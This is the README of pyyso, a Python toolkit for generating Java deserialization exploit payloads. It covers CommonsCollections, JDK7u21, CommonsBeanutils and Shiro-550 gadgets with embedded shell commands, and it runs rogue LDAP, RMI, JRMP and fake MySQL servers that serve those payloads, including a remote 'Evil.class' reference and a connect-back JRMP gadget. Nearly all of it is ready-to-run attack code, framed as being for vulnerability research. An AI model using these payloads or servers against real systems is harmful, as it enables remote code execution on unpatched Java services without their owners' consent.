# pyyso: powerful java serialized toolkit

## What is it?
**pyyso** is a Python package that provides fast and flexible ways to generate java serialized poc.
It aims to be the fundamental high-level building block for doing vulnerability **check and research** in Python.
Additionally, it has a goal of becoming the most convenient and reliable toolkit implemented in Python for Java researchers

## Main Features
Here are just a few of the things that pyyso does well:

- Easy generating of java serialized poc
- Powerful, flexible functionality to start a LDAP/RMI/JRMP/MySQL server to host java serialized pocs
- Communicating and collaborating with other Python packages 
- Won't be exploited back in RMI like java client

pyyso has implemented
- URLDNS Gadget
- CommonsCollections1-7 Gadgets
- JDK7u21 Gadget
- JDK8u21 Gadget
- CommonsBeanutils1 1.8.3 no cc
- CommonsBeanutils1 1.9.2
- shiro-550 rememberMe deserialized
- java class embed with command
- LDAP server hosting java serialized pocs
- LDAP server hosting java remote reference factory
- RMI server
- high JDK version beanfactory bypass
- JRMP server
- JRMPClient Gadget
- Fake MySQL server for JDBC deserialize

## Where to get it
The source code is currently host on GitHub at:
https://github.com/cokeBeer/pyyso

## Installation from sources
```sh
pip install pyyso
```

## How to use
### basic usage

First import pyyso

```python
import pyyso
```
To generate a java serialized zed poc use:
```python
pyyso.urldns("https://x.dnslog.com") #return java serialzed data of URLDNS in bytes
pyyso.cc1("touch /tmp/1") #return java serialzed data of CommonsColletions1 in bytes
pyyso.cc2("touch /tmp/1") #return java serialzed data of CommonsColletions2 in bytes
pyyso.jdk7u21("touch /tmp/1") #return java serialzed data of JDK7u21 in bytes
pyyso.jdk8u20("touch /tmp/1") #return java serialzed data of JDK8u20 in bytes
pyyso.jrmpclient("127.0.0.1",80) #return java serialzed data of jrmpclient in bytes
pyyso.cb1v183("touch /tmp/1") #return java serialzed data of CommonsBeanutils1 1.8.3 no cc in bytes
```
To generate a java class embed with command use:
```python
pyyso.clazz("touch /tmp/1") #return java class embed with command in bytes
```
### shiro 

To encode a shiro poc use:

```python
serobj=pyyso.cb1v183("touch /tmp/1")
pyyso.shiroEncode(serobj=serobj,key=b'kPH+bIxk5D2deZiIxcaaaA==')
```
### LDAP

To start a LDAP server hosting java serialized pocs:

```python
serobj=pyyso.cc1("touch /tmp/1")
server=pyyso.LdapSerialized(serobj=serobj, ip="0.0.0.0", port=1389)
server.run()
```
This will start a LDAP server listening `0.0.0.0:1389` 
You can change the hosted java serialized data by:

```python
server.serobj=pyyso.cc1("rm /tmp/2")
```
To start a LDAP server hosting java remote reference factory:
```python
server=pyyso.LdapRemoteRef(javaCodeBase="http://127.0.0.1:8088/", javaFactory="Evil", javaClassName="java.lang.String", ip="0.0.0.0", port=1389):
server.run()
```
This will start a LDAP server listening `0.0.0.0:1389 ` 
and will return a remote reference point to `http://127.0.0.1:8088/Evil.class`

### JRMP

To start a JRMPListener

```python
serobj=pyyso.cc1("open /tmp",jrmp=True) #note that there is 'jrmp=True'!
server=pyyso.JRMPListener(serobj=,ip="0.0.0.0", port=5151)
server.run()
```

This will start a JRMPListener listening `0.0.0.0:5151`

By deserializing a jrmpclient Gadget in victim's server, the victim's server will connect back to JRMPListener.

the  jrmpclient Gadget should be made by:

```python
serobj=pyyso.jrmpclient(hostname="127.0.0.1", port=5151)
```

which the hostname  is corresponding to where JRMPListener is hosting on

### RMI and bypass

To get a bypass poc, use:

```python
serobj=pyyso.beanfactory("open /tmp", rmi=True)
```

To start a RMI server and host bypass poc, use:

```python
serobj=pyyso.beanfactory("open /",rmi=True) ##note that there is 'rmi=True'!
server=pyyso.RMIServer(serobj=serobj,ip="0.0.0.0", port=1099, refip="0.0.0.0", refport=42155)
server.run()
```

a registry will listen `0.0.0.0:1099`  and a poc provider server will listen `0.0.0.0:42155`

### MySQL

to start a MySQL server hosts JDBC deserialize payload, use:
```python
serobj=pyyso.cc2("open /")
server=pyyso.MysqlServer(serobj=serobj, ip="0.0.0.0", port=3306)
server.run()
```

a fake MySQL server will listen `0.0.0.0:3306`, and wait for `SHOW STATUS`

## Support Options

For some reasons, part Gadgets support  JRMP or RMI now，which can be enabled by `rmi=True` or `jrmp=True`

| Gadgets     | Basic | jrmp option | rmi option |
| ----------- | ----- | ----------- | ---------- |
| CC1-CC7     | ✅     | ✅           | ❌          |
| CB1v192     | ✅     | ✅           | ❌          |
| CB1v183     | ✅     | ✅           | ❌          |
| JDK7u21     | ✅     | ✅           | ❌          |
| beanfactory | ❌     | ❌           | ✅          |
| others      | ✅     | ❌           | ❌          |

## License

[MIT](LICENSE)

## Inspired by
https://github.com/frohoff/ysoserial  
https://github.com/mbechler/marshalsec
